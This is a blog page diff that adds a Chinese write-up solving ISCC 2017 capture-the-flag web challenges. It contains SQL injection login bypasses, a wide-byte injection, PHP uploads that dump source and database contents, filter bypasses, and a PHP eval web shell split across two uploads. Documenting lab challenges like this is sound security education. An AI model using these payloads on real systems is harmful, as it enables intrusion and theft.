@@ -140,6 +140,80 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ISCC-2017-Web-writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/25/ISCC-2017-Web-writeup/">ISCC_2017_Web_writeup</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/25/ISCC-2017-Web-writeup/" class="archive-article-date">
+  	<time datetime="2017-05-25T03:55:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Web签到题，来和我换flag啊！"><a href="#Web签到题，来和我换flag啊！" class="headerlink" title="Web签到题，来和我换flag啊！"></a>Web签到题，来和我换flag啊！</h2><p>POST提交三个f1ag，可在response中拿到flag。</p>
+<p><img src="1.png" alt=""></p>
+<h2 id="WelcomeToMySQL"><a href="#WelcomeToMySQL" class="headerlink" title="WelcomeToMySQL"></a>WelcomeToMySQL</h2><p>F12发现数据库信息在<code>../base.php</code>。上传php5</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="string">"../base.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问upload/xxx.php可拿到base.php源码。<br>再上传一个php5连接数据库可拿到flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"iscc2017"</span>, <span class="string">"iscc2017"</span>);</div><div class="line">mysql_select_db(<span class="string">"flag"</span>,$conn);</div><div class="line">$result = mysql_query(<span class="string">"select * from flag"</span>);</div><div class="line">var_dump(mysql_fetch_row($result));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="where-is-your-flag"><a href="#where-is-your-flag" class="headerlink" title="where is your flag"></a>where is your flag</h2><p>访问flag.php发现hint:thisisflag。可知在表flag中有字段名为thisisflag。尝试GET请求<code>id=1</code>，页面返回正常;请求<code>id=2-1</code>，返回空白页面，可猜测，sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foobar <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$_GET['</span><span class="keyword">id</span><span class="string">']'</span></div></pre></td></tr></table></figure>
+<p>测试可知为宽字节注入,且需要转换编码为gbk:</p>
+<p><img src="2.png" alt=""></p>
+<h2 id="我们一起来日站"><a href="#我们一起来日站" class="headerlink" title="我们一起来日站"></a>我们一起来日站</h2><p>尝试访问<code>robots.txt</code>,发现<code>Disallow: /21232f297a57a5a743894a0e4a801fc3/</code>，提示keep finding admin page，访问<code>/admin.php</code>进入后台登录界面。简单注入：username为<code>admin</code>，passwd为<code>&#39;or 1#</code>拿到flag。</p>
+<h2 id="自相矛盾"><a href="#自相矛盾" class="headerlink" title="自相矛盾"></a>自相矛盾</h2><p>F12拿到部分源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'iscc'</span>]); </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"bar2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line">    &#125;	</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">    <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">		</div><div class="line">        eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>].$d), <span class="string">"isccctf2017"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">		</div><div class="line">    &#125;</div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; </div><div class="line">   </div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其中$v2中的array_search()绕过参考了某个大佬的博客：<a href="http://www.bertramc.cn/2017/03/25/20.html" target="_blank" rel="external">array_search()绕过</a>。$v3中正则的绕过采用%00截断。</p>
+<p><img src="3.png" alt=""></p>
+<h2 id="Simple-sqli"><a href="#Simple-sqli" class="headerlink" title="Simple sqli"></a>Simple sqli</h2><p>验证码要求md5加密后前三位等于一个随机字符串，于是可以写个脚本爆破出符合要求的验证码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#python3.6</span></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">sub = <span class="string">"随机字符串"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">    <span class="keyword">if</span> hashlib.md5(str(i).encode(<span class="string">'utf8'</span>)).hexdigest().startswith(sub):</div><div class="line">    	print(i)</div><div class="line">    	<span class="keyword">break</span></div></pre></td></tr></table></figure>
+<p>测试发现，当Username为<code>admin</code>和<code>&#39; or 1#</code>时显示password error. 输入不存在的Username或者sql语法错误时显示username error. 输入<code>&#39;union select 1</code>亦显示password error. 可以猜测sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> foobar <span class="keyword">WHERE</span> username=<span class="string">''</span></div></pre></td></tr></table></figure>
+<p>然后将查询结果与用户输入的md5加密后的password进行比较。</p>
+<p>于是可以令<code>Username=&#39; union select md5(1)#</code>,<code>Password=1</code>,即可拿到Flag。</p>
+<h2 id="I-have-a-jpg-i-upload-a-txt"><a href="#I-have-a-jpg-i-upload-a-txt" class="headerlink" title="I have a jpg,i upload a txt."></a>I have a jpg,i upload a txt.</h2><p>题目过滤了php标签和script标签。当传入$do=rename时，调用了一个KaIsA()函数，测试后发现大写字母为ascii+6，小写为ascii-6，函数代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#python3.6</span></div><div class="line">a = <span class="string">'base64加密后的字符串'</span></div><div class="line">b = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">	<span class="keyword">if</span> i.isupper():</div><div class="line">		i = ord(i)+<span class="number">6</span></div><div class="line">		<span class="keyword">if</span> i&gt;<span class="number">90</span>:</div><div class="line">			i = chr(i<span class="number">-26</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			i = chr(i)</div><div class="line">	<span class="keyword">elif</span> i.islower():</div><div class="line">		i = ord(i)<span class="number">-6</span></div><div class="line">		<span class="keyword">if</span> i&lt;<span class="number">97</span>:</div><div class="line">			i = chr(i+<span class="number">26</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			i = chr(i)</div><div class="line">	b += i</div><div class="line">	</div><div class="line">print(b)</div></pre></td></tr></table></figure>
+<p>观察源码发现，rename过程中新生成的随机文件名的txt是唯一的，因此可以尝试上传两个使用php短标签的文件，拼成一个txt文件，再更改后缀为php。</p>
+<p>上传的两个文件分别为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;     <span class="comment">//1.txt</span></div><div class="line"></div><div class="line">? <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]); <span class="meta">?&gt;</span>     <span class="comment">//2.txt</span></div></pre></td></tr></table></figure>
+<p>经过两次的rename过程，可以得到一个随机文件名的php，访问upload/xxxxxx.php会跳转到flaggalf.php，抓包可得flag</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/25/ISCC-2017-Web-writeup/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-hexo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
